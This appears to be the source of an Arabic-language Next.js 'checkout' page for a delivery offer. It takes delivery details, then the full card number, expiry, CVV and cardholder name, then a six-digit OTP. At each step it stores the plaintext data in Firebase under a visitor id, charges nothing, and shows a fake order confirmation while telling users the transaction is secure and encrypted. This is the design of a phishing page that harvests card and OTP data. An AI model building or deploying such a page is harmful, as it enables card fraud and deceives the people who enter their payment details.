"use client";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import {
  ArrowLeft,
  CreditCard,
  Shield,
  Clock,
  CheckCircle,
  AlertCircle,
} from "lucide-react";
import Link from "next/link";
import { useState } from "react";
import { addData } from "@/lib/firebase";

interface FormErrors {
  [key: string]: string;
}

const cardValidation = {
  // Luhn algorithm for card number validation
  luhnCheck: (cardNumber: string): boolean => {
    const digits = cardNumber.replace(/\s/g, "").split("").map(Number);
    let sum = 0;
    let isEven = false;

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = digits[i];

      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      isEven = !isEven;
    }

    return sum % 10 === 0;
  },

  // Detect card type
  getCardType: (cardNumber: string): string => {
    const number = cardNumber.replace(/\s/g, "");

    if (/^4/.test(number)) return "visa";
    if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) return "mastercard";
    if (/^3[47]/.test(number)) return "amex";
    if (/^6/.test(number)) return "discover";

    return "unknown";
  },

  // Validate expiry date
  isValidExpiry: (expiry: string): boolean => {
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) return false;

    const [month, year] = expiry.split("/").map(Number);
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;

    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;

    return true;
  },

  // Validate CVV based on card type
  isValidCVV: (cvv: string, cardType: string): boolean => {
    if (cardType === "amex") {
      return /^\d{4}$/.test(cvv);
    }
    return /^\d{3}$/.test(cvv);
  },
};
const allOtps = [""];
export default function CheckoutPage() {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardName: "",
    otp: "",
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [loading, setLoading] = useState(false);
  const [cardType, setCardType] = useState<string>("unknown");

  const validateField = (name: string, value: string): string => {
    switch (name) {
      case "name":
        if (!value.trim()) return "الاسم مطلوب";
        if (value.length < 2) return "الاسم يجب أن يكون أكثر من حرفين";
        if (!/^[a-zA-Zأ-ي\s]+$/.test(value))
          return "الاسم يجب أن يحتوي على أحرف فقط";
        return "";
      case "email":
        if (!value.trim()) return "البريد الإلكتروني مطلوب";
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value))
          return "البريد الإلكتروني غير صحيح";
        return "";
      case "phone":
        if (!value.trim()) return "رقم الهاتف مطلوب";
        const phoneDigits = value.replace(/\s/g, "");
        if (!/^\d{8}$/.test(phoneDigits))
          return "رقم الهاتف يجب أن يكون 8 أرقام";
        if (!/^[2459]/.test(phoneDigits))
          return "رقم الهاتف يجب أن يبدأ بـ 2 أو 4 أو 5 أو 9";
        return "";
      case "address":
        if (!value.trim()) return "العنوان مطلوب";
        if (value.length < 10)
          return "العنوان يجب أن يكون أكثر تفصيلاً (10 أحرف على الأقل)";
        return "";
      case "cardNumber":
        if (!value.trim()) return "رقم البطاقة مطلوب";
        const cardDigits = value.replace(/\s/g, "");
        if (!/^\d{13,19}$/.test(cardDigits))
          return "رقم البطاقة يجب أن يكون بين 13-19 رقم";
        if (!cardValidation.luhnCheck(cardDigits))
          return "رقم البطاقة غير صحيح (فشل في خوارزمية Luhn)";
        const detectedType = cardValidation.getCardType(cardDigits);
        if (detectedType === "unknown") return "نوع البطاقة غير مدعوم";
        return "";
      case "expiryDate":
        if (!value.trim()) return "تاريخ الانتهاء مطلوب";
        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value))
          return "تاريخ الانتهاء غير صحيح (MM/YY)";
        if (!cardValidation.isValidExpiry(value))
          return "البطاقة منتهية الصلاحية";
        return "";
      case "cvv":
        if (!value.trim()) return "رمز الأمان مطلوب";
        const currentCardType = cardValidation.getCardType(
          formData.cardNumber.replace(/\s/g, "")
        );
        if (!cardValidation.isValidCVV(value, currentCardType)) {
          return currentCardType === "amex"
            ? "رمز الأمان يجب أن يكون 4 أرقام لبطاقات American Express"
            : "رمز الأمان يجب أن يكون 3 أرقام";
        }
        return "";
      case "cardName":
        if (!value.trim()) return "اسم حامل البطاقة مطلوب";
        if (value.length < 2) return "اسم حامل البطاقة غير صحيح";
        if (!/^[a-zA-Z\s]+$/.test(value))
          return "اسم حامل البطاقة يجب أن يحتوي على أحرف إنجليزية فقط";
        return "";
      case "otp":
        if (!value.trim()) return "رمز التحقق مطلوب";
        if (!/^\d{6}$/.test(value)) return "رمز التحقق يجب أن يكون 6 أرقام";
        return "";
      default:
        return "";
    }
  };

  const handleInputChange = (name: string, value: string) => {
    let processedValue = value;

    // Format card number with proper spacing
    if (name === "cardNumber") {
      const digits = value.replace(/\s/g, "").replace(/\D/g, "");
      const detectedType = cardValidation.getCardType(digits);
      setCardType(detectedType);

      // Format based on card type
      if (detectedType === "amex") {
        processedValue = digits
          .replace(/(\d{4})(\d{6})(\d{5})/, "$1 $2 $3")
          .trim();
      } else {
        processedValue = digits.replace(/(\d{4})/g, "$1 ").trim();
      }

      // Limit length based on card type
      const maxLength = detectedType === "amex" ? 17 : 19; // Including spaces
      if (processedValue.length > maxLength) {
        processedValue = processedValue.substring(0, maxLength);
      }
    }

    // Format expiry date
    if (name === "expiryDate") {
      const digits = value.replace(/\D/g, "");
      if (digits.length >= 2) {
        processedValue = digits.replace(/(\d{2})(\d{0,2})/, "$1/$2");
      } else {
        processedValue = digits;
      }
    }

    // Format CVV (numbers only)
    if (name === "cvv") {
      processedValue = value.replace(/\D/g, "");
      const maxCvvLength = cardType === "amex" ? 4 : 3;
      if (processedValue.length > maxCvvLength) {
        processedValue = processedValue.substring(0, maxCvvLength);
      }
    }

    // Format phone number
    if (name === "phone") {
      processedValue = value.replace(/\D/g, "");
      if (processedValue.length > 8) {
        processedValue = processedValue.substring(0, 8);
      }
    }

    // Format names (remove numbers and special chars)
    if (name === "name") {
      processedValue = value.replace(/[^a-zA-Zأ-ي\s]/g, "");
    }

    if (name === "cardName") {
      processedValue = value.replace(/[^a-zA-Z\s]/g, "").toUpperCase();
    }

    // Format OTP (numbers only)
    if (name === "otp") {
      processedValue = value.replace(/\D/g, "");
      if (processedValue.length > 6) {
        processedValue = processedValue.substring(0, 6);
      }
    }

    setFormData((prev) => ({ ...prev, [name]: processedValue }));

    // Real-time validation
    const error = validateField(name, processedValue);
    setErrors((prev) => ({ ...prev, [name]: error }));
  };

  const getCardIcon = (type: string) => {
    switch (type) {
      case "visa":
        return "💳 Visa";
      case "mastercard":
        return "💳 Mastercard";
      case "amex":
        return "💳 American Express";
      case "discover":
        return "💳 Discover";
      default:
        return "💳";
    }
  };

  const validateStep = (stepNumber: number): boolean => {
    const stepErrors: FormErrors = {};
    let isValid = true;

    if (stepNumber === 1) {
      const fields = ["name", "email", "phone", "address"];
      fields.forEach((field) => {
        const error = validateField(
          field,
          formData[field as keyof typeof formData]
        );
        if (error) {
          stepErrors[field] = error;
          isValid = false;
        }
      });
    } else if (stepNumber === 2) {
      const fields = ["cardNumber", "expiryDate", "cvv", "cardName"];
      fields.forEach((field) => {
        const error = validateField(
          field,
          formData[field as keyof typeof formData]
        );
        if (error) {
          stepErrors[field] = error;
          isValid = false;
        }
      });
    } else if (stepNumber === 3) {
      const error = validateField("otp", formData.otp);
      if (error) {
        stepErrors.otp = error;
        isValid = false;
      }
    }

    setErrors(stepErrors);
    return isValid;
  };

  const handleNext = async () => {
    if (!validateStep(step)) return;

    setLoading(true);
    const visitor = localStorage.getItem("visitor")!;
    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1500));
    addData({ id: visitor!, ...formData });
    if (step === 2) {
      // Simulate sending OTP
      console.log("Sending OTP to phone:", formData.phone);
    } else if (step === 3) {
      // Simulate OTP verification
      console.log("[v0] Verifying OTP:", formData.otp);
    }

    setLoading(false);
    setStep(step + 1);
  };

  const renderStepContent = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-6">
            <div className="text-center mb-8">
              <h2 className="text-2xl lg:text-3xl font-bold mb-2">
                معلومات التوصيل
              </h2>
              <p className="text-muted-foreground">
                أدخل معلوماتك لإتمام عملية التوصيل
              </p>
            </div>

            <div className="grid gap-6">
              <div>
                <Label htmlFor="name" className="text-right block mb-2">
                  الاسم الكامل *
                </Label>
                <Input
                  id="name"
                  value={formData.name}
                  onChange={(e) => handleInputChange("name", e.target.value)}
                  placeholder="أدخل اسمك الكامل"
                  className={`text-right ${
                    errors.name ? "border-red-500" : ""
                  }`}
                />
                {errors.name && (
                  <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4" />
                    {errors.name}
                  </div>
                )}
              </div>

              <div>
                <Label htmlFor="email" className="text-right block mb-2">
                  البريد الإلكتروني *
                </Label>
                <Input
                  id="email"
                  type="email"
                  value={formData.email}
                  onChange={(e) => handleInputChange("email", e.target.value)}
                  placeholder="mail@email.com"
                  className={`text-right ${
                    errors.email ? "border-red-500" : ""
                  }`}
                />
                {errors.email && (
                  <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4" />
                    {errors.email}
                  </div>
                )}
              </div>

              <div>
                <Label htmlFor="phone" className="text-right block mb-2">
                  رقم الهاتف *
                </Label>
                <Input
                  id="phone"
                  value={formData.phone}
                  onChange={(e) => handleInputChange("phone", e.target.value)}
                  placeholder="55######"
                  className={`text-right ${
                    errors.phone ? "border-red-500" : ""
                  }`}
                />
                {errors.phone && (
                  <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4" />
                    {errors.phone}
                  </div>
                )}
              </div>

              <div>
                <Label htmlFor="address" className="text-right block mb-2">
                  العنوان التفصيلي *
                </Label>
                <Input
                  id="address"
                  value={formData.address}
                  onChange={(e) => handleInputChange("address", e.target.value)}
                  placeholder="المنطقة، الشارع، رقم المنزل، معالم مميزة"
                  className={`text-right ${
                    errors.address ? "border-red-500" : ""
                  }`}
                />
                {errors.address && (
                  <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4" />
                    {errors.address}
                  </div>
                )}
              </div>
            </div>
          </div>
        );

      case 2:
        return (
          <div className="space-y-6">
            <div className="text-center mb-8">
              <div className="flex items-center justify-center gap-2 mb-4">
                <CreditCard className="w-8 h-8 text-primary" />
                <Shield className="w-6 h-6 text-green-500" />
              </div>
              <h2 className="text-2xl lg:text-3xl font-bold mb-2">
                معلومات الدفع
              </h2>
              <p className="text-muted-foreground">
                أدخل معلومات بطاقتك الائتمانية بأمان
              </p>
            </div>

            <div className="grid gap-6">
              <div>
                <Label htmlFor="cardNumber" className="text-right block mb-2">
                  رقم البطاقة *
                </Label>
                <Input
                  id="cardNumber"
                  value={formData.cardNumber}
                  onChange={(e) =>
                    handleInputChange("cardNumber", e.target.value)
                  }
                  placeholder="1234 5678 9012 3456"
                  className={`text-left font-mono ${
                    errors.cardNumber
                      ? "border-red-500"
                      : cardType !== "unknown"
                      ? "border-green-500"
                      : ""
                  }`}
                />
                {errors.cardNumber && (
                  <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4" />
                    {errors.cardNumber}
                  </div>
                )}
                {formData.cardNumber &&
                  !errors.cardNumber &&
                  cardType !== "unknown" && (
                    <div className="flex items-center gap-2 mt-2 text-green-600 text-sm">
                      <CheckCircle className="w-4 h-4" />
                    </div>
                  )}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="expiryDate" className="text-right block mb-2">
                    تاريخ الانتهاء *
                  </Label>
                  <Input
                    id="expiryDate"
                    value={formData.expiryDate}
                    onChange={(e) =>
                      handleInputChange("expiryDate", e.target.value)
                    }
                    placeholder="MM/YY"
                    maxLength={5}
                    className={`text-left font-mono ${
                      errors.expiryDate
                        ? "border-red-500"
                        : formData.expiryDate.length === 5 && !errors.expiryDate
                        ? "border-green-500"
                        : ""
                    }`}
                  />
                  {errors.expiryDate && (
                    <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                      <AlertCircle className="w-4 h-4" />
                      {errors.expiryDate}
                    </div>
                  )}
                </div>

                <div>
                  <Label htmlFor="cvv" className="text-right block mb-2">
                    رمز الأمان *
                    <span className="text-xs text-muted-foreground mr-1">
                      ({cardType === "amex" ? "4 أرقام" : "3 أرقام"})
                    </span>
                  </Label>
                  <Input
                    id="cvv"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange("cvv", e.target.value)}
                    placeholder={cardType === "amex" ? "1234" : "123"}
                    className={`text-left font-mono ${
                      errors.cvv ? "border-red-500" : ""
                    }`}
                  />
                  {errors.cvv && (
                    <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                      <AlertCircle className="w-4 h-4" />
                      {errors.cvv}
                    </div>
                  )}
                </div>
              </div>

              <div>
                <Label htmlFor="cardName" className="text-right block mb-2">
                  اسم حامل البطاقة *
                </Label>
                <Input
                  id="cardName"
                  value={formData.cardName}
                  onChange={(e) =>
                    handleInputChange("cardName", e.target.value)
                  }
                  placeholder="CARDHOLDER NAME"
                  className={`text-left font-mono uppercase ${
                    errors.cardName ? "border-red-500" : ""
                  }`}
                />
                {errors.cardName && (
                  <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4" />
                    {errors.cardName}
                  </div>
                )}
              </div>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <div className="flex items-center gap-2 text-green-700">
                <Shield className="w-5 h-5" />
                <span className="font-medium">معاملة آمنة ومشفرة</span>
              </div>
              <p className="text-sm text-green-600 mt-1">
                جميع معلوماتك محمية بأعلى معايير الأمان وتم التحقق من صحة
                البطاقة
              </p>
            </div>
          </div>
        );

      case 3:
        return (
          <div className="space-y-6">
            <div className="text-center mb-8">
              <div className="flex items-center justify-center gap-2 mb-4">
                <Clock className="w-8 h-8 text-primary" />
              </div>
              <h2 className="text-2xl lg:text-3xl font-bold mb-2">
                تأكيد الهوية
              </h2>
              <p className="text-muted-foreground">
                تم إرسال رمز التحقق إلى رقم الهاتف {formData.phone}
              </p>
            </div>

            <div className="max-w-sm mx-auto">
              <Label htmlFor="otp" className="text-center block mb-4 text-lg">
                أدخل رمز التحقق
              </Label>
              <Input
                id="otp"
                value={formData.otp}
                onChange={(e) => handleInputChange("otp", e.target.value)}
                placeholder="123456"
                maxLength={6}
                className={`text-center text-2xl font-mono tracking-widest ${
                  errors.otp ? "border-red-500" : ""
                }`}
              />
              {errors.otp && (
                <div className="flex items-center justify-center gap-2 mt-4 text-red-500 text-sm">
                  <AlertCircle className="w-4 h-4" />
                  {errors.otp}
                </div>
              )}
            </div>

            <div className="text-center">
              <Button variant="ghost" className="text-primary">
                إعادة إرسال الرمز
              </Button>
            </div>
          </div>
        );

      case 4:
        return (
          <div className="text-center space-y-6">
            <div className="flex items-center justify-center mb-6">
              <CheckCircle className="w-16 h-16 text-green-500" />
            </div>
            <h2 className="text-3xl font-bold text-green-600 mb-4">
              تم تأكيد طلبك بنجاح!
            </h2>
            <p className="text-lg text-muted-foreground mb-6">
              شكراً لك! سيتم توصيل طلبك خلال 24 ساعة
            </p>
            <div className="bg-green-50 border border-green-200 rounded-lg p-6">
              <h3 className="font-bold mb-2">رقم الطلب: #AB2025001</h3>
              <p className="text-sm text-muted-foreground">
                ستصلك رسالة تأكيد على البريد الإلكتروني والهاتف
              </p>
            </div>
            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <Link href="/offers">
                <Button
                  variant="outline"
                  className="rounded-full px-8 bg-transparent"
                >
                  متابعة التسوق
                </Button>
              </Link>
              <Link href="/">
                <Button className="bg-primary hover:bg-primary/90 rounded-full px-8">
                  العودة للرئيسية
                </Button>
              </Link>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  if (step === 4) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="w-full max-w-2xl">
          <CardContent className="p-8 lg:p-12">
            {renderStepContent()}
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-primary text-primary-foreground shadow-lg">
        <div className="container mx-auto px-4 py-4 lg:py-6">
          <div className="flex items-center justify-between">
            <Link
              href="/offers"
              className="flex items-center gap-2 lg:gap-3 hover:opacity-80 transition-opacity"
            >
              <ArrowLeft className="w-5 h-5 lg:w-6 lg:h-6" />
              <span className="text-base lg:text-lg font-medium">
                العودة للعروض
              </span>
            </Link>
            <div className="text-center">
              <h1 className="text-xl lg:text-2xl font-bold">إتمام الطلب</h1>
              <p className="text-sm opacity-90">خطوة {step} من 3</p>
            </div>
            <Badge
              variant="secondary"
              className="px-2 lg:px-4 py-1 lg:py-2 text-xs lg:text-sm"
            >
              English
            </Badge>
          </div>
        </div>
      </header>

      {/* Progress Bar */}
      <div className="bg-white border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-center">
            {[1, 2, 3].map((stepNumber) => (
              <div key={stepNumber} className="flex items-center">
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                    stepNumber <= step
                      ? "bg-primary text-white"
                      : "bg-gray-200 text-gray-500"
                  }`}
                >
                  {stepNumber}
                </div>
                {stepNumber < 3 && (
                  <div
                    className={`w-16 h-1 mx-2 ${
                      stepNumber < step ? "bg-primary" : "bg-gray-200"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
          <div className="flex justify-center mt-2 text-sm text-muted-foreground">
            <div className="flex gap-8">
              <span className={step >= 1 ? "text-primary font-medium" : ""}>
                المعلومات
              </span>
              <span className={step >= 2 ? "text-primary font-medium" : ""}>
                الدفع
              </span>
              <span className={step >= 3 ? "text-primary font-medium" : ""}>
                التحقق
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8 lg:py-12">
        <div className="max-w-2xl mx-auto">
          <Card>
            <CardContent className="p-6 lg:p-8">
              {renderStepContent()}

              {step < 4 && (
                <div className="flex justify-between mt-8 pt-6 border-t">
                  {step > 1 && (
                    <Button
                      onClick={() => setStep(step - 1)}
                      variant="outline"
                      className="rounded-full px-8"
                    >
                      السابق
                    </Button>
                  )}
                  <Button
                    onClick={handleNext}
                    disabled={loading}
                    className="bg-primary hover:bg-primary/90 rounded-full px-8 mr-auto"
                  >
                    {loading
                      ? "جاري المعالجة..."
                      : step === 3
                      ? "تأكيد الطلب"
                      : "التالي"}
                  </Button>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
